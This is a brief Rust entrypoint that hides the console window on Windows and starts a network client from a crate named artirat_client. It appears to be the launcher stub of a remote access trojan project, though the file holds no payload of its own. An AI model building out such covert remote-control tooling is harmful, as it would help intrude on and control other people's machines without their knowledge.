#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use anyhow::Result;

use std::fmt::Error;

use artirat_client;
/// Actual binary entrypoint (thin wrapper)
#[tokio::main]
async fn main() -> Result<()> {
    let _ = artirat_client::netclient().await;
    Ok(())
}